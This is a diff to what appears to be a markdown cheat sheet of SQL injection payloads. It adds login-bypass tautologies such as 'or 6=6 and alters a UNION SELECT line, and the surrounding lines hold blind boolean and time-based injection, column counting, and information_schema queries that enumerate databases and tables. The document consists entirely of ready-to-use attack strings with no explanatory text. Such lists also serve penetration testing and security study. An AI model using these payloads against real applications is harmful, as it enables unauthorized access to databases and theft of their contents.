@@ -7,6 +7,10 @@ heroImage: '/placeholder-hero.jpg'
 
 ```bash
 #SQL Injection
+'or 6=6
+'or 0x47=0x47
+or char(32)=''
+or 6 is not null
 admin' or 1=1-- -
 admin' or true-- -
 admin' order by 100-- -
@@ -23,7 +27,7 @@ admin' and if(substr((select group_concat(schema_name) from information_schema.s
        │ 'a',sleep(5),1)-- -
 
 #Database names
-' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
+' UniOn  Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata
 
 #Tables of a database
 ' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]
